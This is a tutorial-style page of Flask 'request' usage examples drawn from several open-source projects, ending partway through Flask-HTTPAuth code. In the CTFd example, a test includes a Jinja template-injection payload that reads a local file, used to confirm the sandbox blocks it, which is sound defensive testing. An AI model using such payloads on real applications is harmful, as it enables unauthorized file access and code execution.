title: flask.globals request Example Code
category: page
slug: flask-globals-request-examples
sortorder: 500021016
toc: False
sidebartitle: flask.globals request
meta: Python example code that shows how to use the request callable from the flask.globals module of the Flask project.


[request](https://github.com/pallets/flask/blob/master/src/flask/globals.py)
is function in [Flask](/flask.html)'s `flask.globals` module and is an
instance of
[LocalProxy](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/local.py)
from the [Werkzeug](https://werkzeug.palletsprojects.com/en/1.0.x/) library.
`request` stores data about the active HTTP request and can be used to access
data about that request.

Note that `request` is typically imported directly from `flask` instead of
from `flask.globals`, even though it is defined within the `globals` module.
It's the same import, just less characters to type when you import it
from `flask`.

<a href="/flask-globals-current-app-examples.html">current_app</a>,
<a href="/flask-globals-g-examples.html">g</a>,
and <a href="/flask-globals-session-examples.html">session</a>
are several other callables with code examples from the same `flask.globals` package.

## Example 1 from Braintree Flask app
[Braintree's Flask example payments app](https://github.com/braintree/braintree_flask_example)
demonstrates how to incorporate this payment provider's
[API](/application-programming-interfaces.html) into your
[Flask](/flask.html) [web application](/web-development.html).
The code is open sourced under the
[MIT license](https://github.com/braintree/braintree_flask_example/blob/master/LICENSE).

[**Braintree Flask app / app.py**](https://github.com/braintree/braintree_flask_example/blob/master/././app.py)

```python
# app.py
~~from flask import Flask, redirect, url_for, render_template, request, flash

import os
from os.path import join, dirname
from dotenv import load_dotenv
import braintree
from gateway import generate_client_token, transact, find_transaction

load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get('APP_SECRET_KEY')

PORT = int(os.environ.get('PORT', 4567))

TRANSACTION_SUCCESS_STATUSES = [
    braintree.Transaction.Status.Authorized,
    braintree.Transaction.Status.Authorizing,
    braintree.Transaction.Status.Settled,
    braintree.Transaction.Status.SettlementConfirmed,
    braintree.Transaction.Status.SettlementPending,
    braintree.Transaction.Status.Settling,
    braintree.Transaction.Status.SubmittedForSettlement
]



## ... source file abbreviated to get to request examples ...


    client_token = generate_client_token()
    return render_template('checkouts/new.html', client_token=client_token)

@app.route('/checkouts/<transaction_id>', methods=['GET'])
def show_checkout(transaction_id):
    transaction = find_transaction(transaction_id)
    result = {}
    if transaction.status in TRANSACTION_SUCCESS_STATUSES:
        result = {
            'header': 'Sweet Success!',
            'icon': 'success',
            'message': 'Your test transaction has been successfully processed. See the Braintree API response and try again.'
        }
    else:
        result = {
            'header': 'Transaction Failed',
            'icon': 'fail',
            'message': 'Your test transaction has a status of ' + transaction.status + '. See the Braintree API response and try again.'
        }

    return render_template('checkouts/show.html', transaction=transaction, result=result)

@app.route('/checkouts', methods=['POST'])
def create_checkout():
    result = transact({
~~        'amount': request.form['amount'],
~~        'payment_method_nonce': request.form['payment_method_nonce'],
        'options': {
            "submit_for_settlement": True
        }
    })

    if result.is_success or result.transaction:
        return redirect(url_for('show_checkout',transaction_id=result.transaction.id))
    else:
        for x in result.errors.deep_errors: flash('Error: %s: %s' % (x.code, x.message))
        return redirect(url_for('new_checkout'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=True)



## ... source file continues with no further request examples...

```


## Example 2 from CTFd
[CTFd](https://github.com/CTFd/CTFd)
([homepage](https://ctfd.io/)) is a
[capture the flag (CTF) hacking web app](https://cybersecurity.att.com/blogs/security-essentials/capture-the-flag-ctf-what-is-it-for-a-newbie)
built with [Flask](/flask.html). The application can be used
as-is to run CTF events, or modified for custom rules for related
scenarios. CTFd is open sourced under the
[Apache License 2.0](https://github.com/CTFd/CTFd/blob/master/LICENSE).

[**CTFd / tests / test_themes.py**](https://github.com/CTFd/CTFd/blob/master/./tests/test_themes.py)

```python
# test_themes.py

~~from flask import request
from jinja2.sandbox import SecurityError
from werkzeug.test import Client

from CTFd.utils import get_config
from tests.helpers import create_ctfd, destroy_ctfd, gen_user, login_as_user


def test_themes_run_in_sandbox():
    app = create_ctfd()
    with app.app_context():
        try:
            app.jinja_env.from_string(
                "{{ ().__class__.__bases__[0].__subclasses__()[40]('./test_utils.py').read() }}"
            ).render()
        except SecurityError:
            pass
        except Exception as e:
            raise e
    destroy_ctfd(app)


def test_themes_cant_access_configpy_attributes():
    app = create_ctfd()
    with app.app_context():


## ... source file abbreviated to get to request examples ...


            r = client.post("/setup", data=data)
            assert r.status_code == 302
            assert r.location == "http://localhost/ctf/"

            c = Client(app)
            app_iter, status, headers = c.get("/")
            headers = dict(headers)
            assert status == "302 FOUND"
            assert headers["Location"] == "http://localhost/ctf/"

            r = client.get("/challenges")
            assert r.status_code == 200
            assert "Challenges" in r.get_data(as_text=True)

            r = client.get("/scoreboard")
            assert r.status_code == 200
            assert "Scoreboard" in r.get_data(as_text=True)
    destroy_ctfd(app)


def test_that_request_path_hijacking_works_properly():
    app = create_ctfd(setup=False, application_root="/ctf")
    assert app.request_class.__name__ == "CTFdRequest"
    with app.app_context():
        with app.test_request_context("/challenges"):
~~            assert request.path == "/ctf/challenges"
    destroy_ctfd(app)

    app = create_ctfd()
    assert app.request_class.__name__ == "CTFdRequest"
    with app.app_context():
        with app.test_request_context("/challenges"):
~~            assert request.path == "/challenges"

        from flask import Flask

        test_app = Flask("test")
        assert test_app.request_class.__name__ == "Request"
        with test_app.test_request_context("/challenges"):
~~            assert request.path == "/challenges"
    destroy_ctfd(app)



## ... source file continues with no further request examples...

```


## Example 3 from Flask AppBuilder
[Flask-AppBuilder](https://github.com/dpgaspar/Flask-AppBuilder)
([documentation](https://flask-appbuilder.readthedocs.io/en/latest/)
and
[example apps](https://github.com/dpgaspar/Flask-AppBuilder/tree/master/examples))
is a web application generator that uses Flask to automatically create
the code for database-driven applications based on parameters set
by the user. The generated applications include default security settings,
forms, and internationalization support.

Flask App Builder is provided under the
[BSD 3-Clause "New" or "Revised" license](https://github.com/dpgaspar/Flask-AppBuilder/blob/master/LICENSE).

[**Flask AppBuilder / flask_appbuilder / urltools.py**](https://github.com/dpgaspar/Flask-AppBuilder/blob/master/flask_appbuilder/./urltools.py)

```python
# urltools.py
import re

~~from flask import request


class Stack(object):

    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data


def get_group_by_args():
~~    group_by = request.args.get("group_by")
    if not group_by:
        group_by = ""
    return group_by


def get_page_args():
    pages = {}
~~    for arg in request.args:
        re_match = re.findall("page_(.*)", arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages


def get_page_size_args():
    page_sizes = {}
~~    for arg in request.args:
        re_match = re.findall("psize_(.*)", arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes


def get_order_args():
    orders = {}
~~    for arg in request.args:
        re_match = re.findall("_oc_(.*)", arg)
        if re_match:
~~            order_direction = request.args.get("_od_" + re_match[0])
            if order_direction in ("asc", "desc"):
                orders[re_match[0]] = (request.args.get(arg), order_direction)
    return orders


def get_filter_args(filters):
    filters.clear_filters()
~~    for arg in request.args:
        re_match = re.findall("_flt_(\d)_(.*)", arg)
        if re_match:
            filters.add_filter_index(
~~                re_match[0][1], int(re_match[0][0]), request.args.get(arg)
            )



## ... source file continues with no further request examples...

```


## Example 4 from FlaskBB
[FlaskBB](https://github.com/flaskbb/flaskbb)
([project website](https://flaskbb.org/)) is a [Flask](/flask.html)-based
forum web application. The web app allows users to chat in an open
message board or send private messages in plain text or
[Markdown](/markdown.html).

FlaskBB is provided as open source
[under this license](https://github.com/flaskbb/flaskbb/blob/master/LICENSE).

[**FlaskBB / flaskbb / management / views.py**](https://github.com/flaskbb/flaskbb/blob/master/flaskbb/management/views.py)

```python
# views.py
import logging
import sys

from celery import __version__ as celery_version
from flask import __version__ as flask_version
~~from flask import (Blueprint, current_app, flash, jsonify, redirect, request,
                   url_for)
from flask.views import MethodView
from flask_allows import Not, Permission
from flask_babelplus import gettext as _
from flask_login import current_user, login_fresh
from pluggy import HookimplMarker

from flaskbb import __version__ as flaskbb_version
from flaskbb.extensions import allows, celery, db
from flaskbb.forum.forms import UserSearchForm
from flaskbb.forum.models import Category, Forum, Post, Report, Topic
from flaskbb.management.forms import (AddForumForm, AddGroupForm, AddUserForm,
                                      CategoryForm, EditForumForm,
                                      EditGroupForm, EditUserForm)
from flaskbb.management.models import Setting, SettingsGroup
from flaskbb.plugins.models import PluginRegistry, PluginStore
from flaskbb.plugins.utils import validate_plugin
from flaskbb.user.models import Group, Guest, User
from flaskbb.utils.forms import populate_settings_dict, populate_settings_form
from flaskbb.utils.helpers import (get_online_users, register_view,
                                   render_template, time_diff, time_utcnow,
                                   FlashAndRedirect)
from flaskbb.utils.requirements import (CanBanUser, CanEditUser, IsAdmin,
                                        IsAtleastModerator,


## ... source file abbreviated to get to request examples ...


            flash(_("Settings saved."), "success")

        return render_template(
            "management/settings.html",
            form=form,
            all_groups=all_groups,
            all_plugins=all_plugins,
            active_nav=active_nav
        )


class ManageUsers(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to manage users"),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]
    form = UserSearchForm

    def get(self):
~~        page = request.args.get('page', 1, type=int)
        form = self.form()

        users = User.query.order_by(User.id.asc()).paginate(
            page, flaskbb_config['USERS_PER_PAGE'], False
        )

        return render_template(
            'management/users.html', users=users, search_form=form
        )

    def post(self):
~~        page = request.args.get('page', 1, type=int)
        form = self.form()

        if form.validate():
            users = form.get_results().\
                paginate(page, flaskbb_config['USERS_PER_PAGE'], False)
            return render_template(
                'management/users.html', users=users, search_form=form
            )

        users = User.query.order_by(User.id.asc()).paginate(
            page, flaskbb_config['USERS_PER_PAGE'], False
        )

        return render_template(
            'management/users.html', users=users, search_form=form
        )


class EditUser(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator, CanEditUser,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to manage users"),


## ... source file abbreviated to get to request examples ...


                user.password = form.password.data

            user.save(groups=form.secondary_groups.data)

            flash(_('User updated.'), 'success')
            return redirect(url_for('management.edit_user', user_id=user.id))

        return render_template(
            'management/user_form.html', form=form, title=_('Edit User')
        )


class DeleteUser(MethodView):
    decorators = [
        allows.requires(
            IsAdmin,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to manage users"),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def post(self, user_id=None):
~~        if request.is_xhr:
~~            ids = request.get_json()["ids"]

            data = []
            for user in User.query.filter(User.id.in_(ids)).all():
                if current_user.id == user.id:
                    continue

                if user.delete():
                    data.append(
                        {
                            "id": user.id,
                            "type": "delete",
                            "reverse": False,
                            "reverse_name": None,
                            "reverse_url": None
                        }
                    )

            return jsonify(
                message="{} users deleted.".format(len(data)),
                category="success",
                data=data,
                status=200
            )



## ... source file abbreviated to get to request examples ...


        form = self.form()
        if form.validate_on_submit():
            form.save()
            flash(_('User added.'), 'success')
            return redirect(url_for('management.users'))

        return render_template(
            'management/user_form.html', form=form, title=_('Add User')
        )


class BannedUsers(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to manage users"),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]
    form = UserSearchForm

    def get(self):
~~        page = request.args.get('page', 1, type=int)
        search_form = self.form()

        users = User.query.filter(
            Group.banned == True, Group.id == User.primary_group_id
        ).paginate(page, flaskbb_config['USERS_PER_PAGE'], False)

        return render_template(
            'management/banned_users.html',
            users=users,
            search_form=search_form
        )

    def post(self):
~~        page = request.args.get('page', 1, type=int)
        search_form = self.form()

        users = User.query.filter(
            Group.banned == True, Group.id == User.primary_group_id
        ).paginate(page, flaskbb_config['USERS_PER_PAGE'], False)

        if search_form.validate():
            users = search_form.get_results().\
                paginate(page, flaskbb_config['USERS_PER_PAGE'], False)

            return render_template(
                'management/banned_users.html',
                users=users,
                search_form=search_form
            )

        return render_template(
            'management/banned_users.html',
            users=users,
            search_form=search_form
        )


class BanUser(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to manage users"),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def post(self, user_id=None):
        if not Permission(CanBanUser, identity=current_user):
            flash(
                _("You do not have the permissions to ban this user."),
                "danger"
            )
            return redirect(url_for("management.overview"))

~~        if request.is_xhr:
~~            ids = request.get_json()["ids"]

            data = []
            users = User.query.filter(User.id.in_(ids)).all()
            for user in users:
                if (current_user.id == user.id or
                        Permission(IsAdmin, identity=user) and
                        Permission(Not(IsAdmin), current_user)):
                    continue

                elif user.ban():
                    data.append(
                        {
                            "id":
                            user.id,
                            "type":
                            "ban",
                            "reverse":
                            "unban",
                            "reverse_name":
                            _("Unban"),
                            "reverse_url":
                            url_for("management.unban_user", user_id=user.id)
                        }
                    )


## ... source file abbreviated to get to request examples ...


        return redirect(url_for("management.banned_users"))


class UnbanUser(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to manage users"),
                level="danger",
                endpoint="management.overview"
            )

        )
    ]

    def post(self, user_id=None):

        if not Permission(CanBanUser, identity=current_user):
            flash(
                _("You do not have the permissions to unban this user."),
                "danger"
            )
            return redirect(url_for("management.overview"))

~~        if request.is_xhr:
~~            ids = request.get_json()["ids"]

            data = []
            for user in User.query.filter(User.id.in_(ids)).all():
                if user.unban():
                    data.append(
                        {
                            "id": user.id,
                            "type": "unban",
                            "reverse": "ban",
                            "reverse_name": _("Ban"),
                            "reverse_url": url_for("management.ban_user",
                                                   user_id=user.id)
                        }
                    )

            return jsonify(
                message="{} users unbanned.".format(len(data)),
                category="success",
                data=data,
                status=200
            )

        user = User.query.filter_by(id=user_id).first_or_404()

        if user.unban():
            flash(_("User is now unbanned."), "success")
        else:
            flash(_("Could not unban user."), "danger")

        return redirect(url_for("management.banned_users"))


class Groups(MethodView):
    decorators = [
        allows.requires(
            IsAdmin,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to modify groups."),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def get(self):

~~        page = request.args.get("page", 1, type=int)

        groups = Group.query.\
            order_by(Group.id.asc()).\
            paginate(page, flaskbb_config['USERS_PER_PAGE'], False)

        return render_template("management/groups.html", groups=groups)


class AddGroup(MethodView):
    decorators = [
        allows.requires(
            IsAdmin,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to modify groups."),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]
    form = AddGroupForm

    def get(self):
        return render_template(
            'management/group_form.html',


## ... source file abbreviated to get to request examples ...



            if group.guest:
                Guest.invalidate_cache()

            flash(_('Group updated.'), 'success')
            return redirect(url_for('management.groups', group_id=group.id))

        return render_template(
            'management/group_form.html', form=form, title=_('Edit Group')
        )


class DeleteGroup(MethodView):
    decorators = [
        allows.requires(
            IsAdmin,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to modify groups."),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def post(self, group_id=None):
~~        if request.is_xhr:
~~            ids = request.get_json()["ids"]
            if not (set(ids) & set(["1", "2", "3", "4", "5", "6"])):
                data = []
                for group in Group.query.filter(Group.id.in_(ids)).all():
                    group.delete()
                    data.append(
                        {
                            "id": group.id,
                            "type": "delete",
                            "reverse": False,
                            "reverse_name": None,
                            "reverse_url": None
                        }
                    )

                return jsonify(
                    message="{} groups deleted.".format(len(data)),
                    category="success",
                    data=data,
                    status=200
                )
            return jsonify(
                message=_("You cannot delete one of the standard groups."),
                category="danger",
                data=None,


## ... source file abbreviated to get to request examples ...


        category = Category.query.filter_by(id=category_id).first_or_404()

        involved_users = User.query.filter(
            Forum.category_id == category.id, Topic.forum_id == Forum.id,
            Post.user_id == User.id
        ).all()

        category.delete(involved_users)
        flash(_("Category with all associated forums deleted."), "success")
        return redirect(url_for("management.forums"))


class Reports(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to view reports."),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def get(self):
~~        page = request.args.get("page", 1, type=int)
        reports = Report.query.\
            order_by(Report.id.asc()).\
            paginate(page, flaskbb_config['USERS_PER_PAGE'], False)

        return render_template("management/reports.html", reports=reports)


class UnreadReports(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to view reports."),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def get(self):
~~        page = request.args.get("page", 1, type=int)
        reports = Report.query.\
            filter(Report.zapped == None).\
            order_by(Report.id.desc()).\
            paginate(page, flaskbb_config['USERS_PER_PAGE'], False)

        return render_template("management/reports.html", reports=reports)


class MarkReportRead(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to view reports."),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def post(self, report_id=None):

~~        if request.is_xhr:
~~            ids = request.get_json()["ids"]
            data = []

            for report in Report.query.filter(Report.id.in_(ids)).all():
                report.zapped_by = current_user.id
                report.zapped = time_utcnow()
                report.save()
                data.append(
                    {
                        "id": report.id,
                        "type": "read",
                        "reverse": False,
                        "reverse_name": None,
                        "reverse_url": None
                    }
                )

            return jsonify(
                message="{} reports marked as read.".format(len(data)),
                category="success",
                data=data,
                status=200
            )

        if report_id:


## ... source file abbreviated to get to request examples ...


            report.zapped_by = current_user.id
            report.zapped = time_utcnow()
            report_list.append(report)

        db.session.add_all(report_list)
        db.session.commit()

        flash(_("All reports were marked as read."), "success")
        return redirect(url_for("management.reports"))


class DeleteReport(MethodView):
    decorators = [
        allows.requires(
            IsAtleastModerator,
            on_fail=FlashAndRedirect(
                message=_("You are not allowed to view reports."),
                level="danger",
                endpoint="management.overview"
            )
        )
    ]

    def post(self, report_id=None):

~~        if request.is_xhr:
~~            ids = request.get_json()["ids"]
            data = []

            for report in Report.query.filter(Report.id.in_(ids)).all():
                if report.delete():
                    data.append(
                        {
                            "id": report.id,
                            "type": "delete",
                            "reverse": False,
                            "reverse_name": None,
                            "reverse_url": None
                        }
                    )

            return jsonify(
                message="{} reports deleted.".format(len(data)),
                category="success",
                data=data,
                status=200
            )

        report = Report.query.filter_by(id=report_id).first_or_404()
        report.delete()
        flash(_("Report deleted."), "success")


## ... source file continues with no further request examples...

```


## Example 5 from flask-bones
[flask-bones](https://github.com/cburmeister/flask-bones)
([demo](http://flask-bones.herokuapp.com/))
is large scale [Flask](/flask.html) example application built
with [Blueprints](https://flask.palletsprojects.com/en/1.1.x/blueprints/)
([example Blueprint code](/flask-blueprints-blueprint-examples.html)).
This project is provided as open source under the
[MIT license](https://github.com/cburmeister/flask-bones/blob/master/LICENSE).

[**flask-bones / app / __init__.py**](https://github.com/cburmeister/flask-bones/blob/master/app/./__init__.py)

```python
# __init__.py
import time

~~from flask import Flask, g, render_template, request
import arrow
import requests

from app import config
from app.assets import assets
from app.auth import auth
from app.commands import create_db, drop_db, populate_db, recreate_db
from app.database import db
from app.extensions import lm, travis, mail, migrate, bcrypt, babel, rq, limiter
from app.user import user
from app.utils import url_for_other_page


def create_app(config=config.base_config):
    app = Flask(__name__)
    app.config.from_object(config)

    register_extensions(app)
    register_blueprints(app)
    register_errorhandlers(app)
    register_jinja_env(app)
    register_commands(app)

    def get_locale():
~~        return request.accept_languages.best_match(config.SUPPORTED_LOCALES)

    if babel.locale_selector_func is None:
        babel.locale_selector_func = get_locale

    @app.before_request
    def before_request():
        g.request_start_time = time.time()
        g.request_time = lambda: '%.5fs' % (time.time() - g.request_start_time)
~~        g.pjax = 'X-PJAX' in request.headers

    @app.route('/', methods=['GET'])
    def index():
        return render_template('index.html')

    return app


def register_commands(app):
    for command in [create_db, drop_db, populate_db, recreate_db]:
        app.cli.command()(command)


def register_extensions(app):
    travis.init_app(app)
    db.init_app(app)
    lm.init_app(app)
    mail.init_app(app)
    bcrypt.init_app(app)
    assets.init_app(app)
    babel.init_app(app)
    rq.init_app(app)
    migrate.init_app(app, db)
    limiter.init_app(app)


## ... source file continues with no further request examples...

```


## Example 6 from flask-bookshelf
[flask-bookshelf](https://github.com/damyanbogoev/flask-bookshelf) is the
example [Flask](/flask.html) application that developers create when
going through
[this Flask series of blog posts](https://damyanon.net/tags/flask-series/).

[**flask-bookshelf / bookshelf / admin / controllers.py**](https://github.com/damyanbogoev/flask-bookshelf/blob/master/bookshelf/admin/controllers.py)

```python
# controllers.py
from sqlalchemy import exc
from flask import Blueprint, render_template, flash
~~from flask import current_app, redirect, request, url_for
from flask_security.decorators import roles_required
from bookshelf.admin.forms.author_forms import CreateAuthorForm
from bookshelf.cache import cache
from bookshelf.data.models import Author, db


admin = Blueprint("admin", __name__, template_folder="templates")


@admin.route("/")
@roles_required("admin")
def index():
    return render_template("admin_index.htm")


@admin.route("/author/create", methods=["GET", "POST"])
@roles_required("admin")
def create_author():
    form = CreateAuthorForm(request.form)
~~    if request.method == "POST" and form.validate():
        names = form.names.data
        current_app.logger.info("Adding a new author %s.", (names))
        author = Author(names)

        try:
            db.session.add(author)
            db.session.commit()
            cache.clear()
            flash("Author successfully created.")
        except exc.SQLAlchemyError as e:
            flash("Author was not created.")
            current_app.logger.error(e)

            return redirect(url_for("admin.create_author"))

        return redirect(url_for("main.display_authors"))

    return render_template("create_author.htm", form=form)



## ... source file continues with no further request examples...

```


## Example 7 from flask-debugtoolbar
[Flask Debug-toolbar](https://github.com/flask-debugtoolbar/flask-debugtoolbar)
([documentation](https://flask-debugtoolbar.readthedocs.io/en/latest/)
and
[PyPI page](https://pypi.org/project/Flask-DebugToolbar/))
is a [Flask](/flask.html) conversion of the popular
[Django Debug Toolbar](https://github.com/jazzband/django-debug-toolbar)
project. This extension creates a sidebar with useful debugging
information when you are running a Flask application in development
mode. The project is provided as open source under
[this license](https://github.com/flask-debugtoolbar/flask-debugtoolbar/blob/master/LICENSE).

[**flask-debugtoolbar / flask_debugtoolbar / __init__.py**](https://github.com/flask-debugtoolbar/flask-debugtoolbar/blob/master/flask_debugtoolbar/./__init__.py)

```python
# __init__.py
import os
import warnings

~~from flask import Blueprint, current_app, request, g, send_from_directory, url_for
from flask.globals import _request_ctx_stack
from jinja2 import Environment, PackageLoader
from werkzeug.urls import url_quote_plus

from flask_debugtoolbar.compat import iteritems
from flask_debugtoolbar.toolbar import DebugToolbar
from flask_debugtoolbar.utils import decode_text, gzip_compress, gzip_decompress

try:
    from importlib.metadata import version

    __version__ = version("Flask-DebugToolbar")
except ImportError:
    import pkg_resources

    __version__ = pkg_resources.get_distribution("Flask-DebugToolbar").version


module = Blueprint('debugtoolbar', __name__)


def replace_insensitive(string, target, replacement):
    no_case = string.lower()
    index = no_case.rfind(target.lower())


## ... source file abbreviated to get to request examples ...


                'flask_debugtoolbar.panels.route_list.RouteListDebugPanel',
                'flask_debugtoolbar.panels.profiler.ProfilerDebugPanel',
                'flask_debugtoolbar.panels.g.GDebugPanel',
            ),
        }

    def dispatch_request(self):
        req = _request_ctx_stack.top.request
        app = current_app

        if req.routing_exception is not None:
            app.raise_routing_exception(req)

        rule = req.url_rule

        if getattr(rule, 'provide_automatic_options', False) \
           and req.method == 'OPTIONS':
            return app.make_default_options_response()

        view_func = app.view_functions[rule.endpoint]
        view_func = self.process_view(app, view_func, req.view_args)

        return view_func(**req.view_args)

    def _show_toolbar(self):
~~        if request.blueprint == 'debugtoolbar':
            return False

        hosts = current_app.config['DEBUG_TB_HOSTS']
~~        if hosts and request.remote_addr not in hosts:
            return False

        return True

    def send_static_file(self, filename):
        return send_from_directory(self._static_dir, filename)

    def process_request(self):
        g.debug_toolbar = self

        if not self._show_toolbar():
            return

~~        real_request = request._get_current_object()

        self.debug_toolbars[real_request] = (
            DebugToolbar(real_request, self.jinja_env))

        for panel in self.debug_toolbars[real_request].panels:
            panel.process_request(real_request)

    def process_view(self, app, view_func, view_kwargs):
~~        real_request = request._get_current_object()
        try:
            toolbar = self.debug_toolbars[real_request]
        except KeyError:
            return view_func

        for panel in toolbar.panels:
            new_view = panel.process_view(real_request, view_func, view_kwargs)
            if new_view:
                view_func = new_view

        return view_func

    def process_response(self, response):
~~        real_request = request._get_current_object()
        if real_request not in self.debug_toolbars:
            return response

        if current_app.config['DEBUG_TB_INTERCEPT_REDIRECTS']:
            if response.status_code in self._redirect_codes:
                redirect_to = response.location
                redirect_code = response.status_code
                if redirect_to:
                    content = self.render('redirect.html', {
                        'redirect_to': redirect_to,
                        'redirect_code': redirect_code
                    })
                    response.content_length = len(content)
                    response.location = None
                    response.response = [content]
                    response.status_code = 200

        if not (response.status_code == 200 and
                response.is_sequence and
                response.headers['content-type'].startswith('text/html')):
            return response

        if 'gzip' in response.headers.get('Content-Encoding', ''):
            response_html = gzip_decompress(response.data).decode(response.charset)


## ... source file continues with no further request examples...

```


## Example 8 from flaskex
[Flaskex](https://github.com/anfederico/Flaskex) is a working example
[Flask](/flask.html) web application intended as a base to build your
own applications upon. The application comes with pre-built sign up, log in
and related screens, as well as a database backend. Flaskex is provided
as open source under the
[MIT license](https://github.com/anfederico/Flaskex/blob/master/LICENSE.txt).

[**flaskex / app.py**](https://github.com/anfederico/Flaskex/blob/master/././app.py)

```python
# app.py

from scripts import tabledef
from scripts import forms
from scripts import helpers
~~from flask import Flask, redirect, url_for, render_template, request, session
import json
import sys
import os

app = Flask(__name__)
app.secret_key = os.urandom(12)  # Generic key for dev purposes only


@app.route('/', methods=['GET', 'POST'])
def login():
    if not session.get('logged_in'):
        form = forms.LoginForm(request.form)
~~        if request.method == 'POST':
~~            username = request.form['username'].lower()
~~            password = request.form['password']
            if form.validate():
                if helpers.credentials_valid(username, password):
                    session['logged_in'] = True
                    session['username'] = username
                    return json.dumps({'status': 'Login successful'})
                return json.dumps({'status': 'Invalid user/pass'})
            return json.dumps({'status': 'Both fields required'})
        return render_template('login.html', form=form)
    user = helpers.get_user()
    return render_template('home.html', user=user)


@app.route("/logout")
def logout():
    session['logged_in'] = False
    return redirect(url_for('login'))


@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if not session.get('logged_in'):
        form = forms.LoginForm(request.form)
~~        if request.method == 'POST':
~~            username = request.form['username'].lower()
            password = helpers.hash_password(request.form['password'])
~~            email = request.form['email']
            if form.validate():
                if not helpers.username_taken(username):
                    helpers.add_user(username, password, email)
                    session['logged_in'] = True
                    session['username'] = username
                    return json.dumps({'status': 'Signup successful'})
                return json.dumps({'status': 'Username taken'})
            return json.dumps({'status': 'User/Pass required'})
        return render_template('login.html', form=form)
    return redirect(url_for('login'))


@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if session.get('logged_in'):
~~        if request.method == 'POST':
~~            password = request.form['password']
            if password != "":
                password = helpers.hash_password(password)
~~            email = request.form['email']
            helpers.change_user(password=password, email=email)
            return json.dumps({'status': 'Saved'})
        user = helpers.get_user()
        return render_template('settings.html', user=user)
    return redirect(url_for('login'))


if __name__ == "__main__":
    app.run(debug=True, use_reloader=True, host="0.0.0.0")



## ... source file continues with no further request examples...

```


## Example 9 from Flask-HTTPAuth
[Flask-HTTPAuth](https://github.com/miguelgrinberg/Flask-HTTPAuth)
([documentation](https://flask-httpauth.readthedocs.io/en/latest/)
and
[PyPI package information](https://pypi.org/project/Flask-HTTPAuth/))
is a [Flask](/flask.html) framework extension that creates
Basic and Digest HTTP authentication for routes. This project
is primarily built and maintained by
[Miguel Grinberg](https://blog.miguelgrinberg.com/). It is provided
as open source under the
[MIT license](https://github.com/miguelgrinberg/Flask-HTTPAuth/blob/master/LICENSE).

[**Flask-HTTPAuth / flask_httpauth.py**](https://github.com/miguelgrinberg/Flask-HTTPAuth/blob/master/././flask_httpauth.py)

```python
# flask_httpauth.py

from base64 import b64decode
from functools import wraps
from hashlib import md5
from random import Random, SystemRandom
~~from flask import request, make_response, session, g
from werkzeug.datastructures import Authorization
from werkzeug.security import safe_str_cmp

__version__ = '4.1.1dev'


class HTTPAuth(object):
    def __init__(self, scheme=None, realm=None, header=None):
        self.scheme = scheme
        self.realm = realm or "Authentication Required"
        self.header = header
        self.get_password_callback = None
        self.get_user_roles_callback = None
        self.auth_error_callback = None

        def default_get_password(username):
            return None

        def default_auth_error(status):
            return "Unauthorized Access", status

        self.get_password(default_get_password)
        self.error_handler(default_auth_error)



## ... source file abbreviated to get to request examples ...


        return f

    def get_user_roles(self, f):
        self.get_user_roles_callback = f
        return f

    def error_handler(self, f):
        @wraps(f)
        def decorated(*args, **kwargs):
            res = f(*args, **kwargs)
            res = make_response(res)
            if res.status_code == 200:
                res.status_code = 401
            if 'WWW-Authenticate' not in res.headers.keys():
                res.headers['WWW-Authenticate'] = self.authenticate_header()
            return res
        self.auth_error_callback = decorated
        return decorated

    def authenticate_header(self):
        return '{0} realm="{1}"'.format(self.scheme, self.realm)

    def get_auth(self):
        auth = None
        if self.header is None or self.header == 'Authorization':
~~            auth = request.authorization
~~            if auth is None and 'Authorization' in request.headers:
                try:
~~                    auth_type, token = request.headers['Authorization'].split(
                        None, 1)
                    auth = Authorization(auth_type, {'token': token})
                except (ValueError, KeyError):
                    pass
~~        elif self.header in request.headers:
            auth = Authorization(self.scheme,
~~                                 {'token': request.headers[self.header]})

        if auth is not None and auth.type.lower() != self.scheme.lower():
            auth = None

        return auth

    def get_auth_password(self, auth):
        password = None

        if auth and auth.username:
            password = self.get_password_callback(auth.username)

        return password

    def authorize(self, role, user, auth):
        if role is None:
            return True
        if isinstance(role, (list, tuple)):
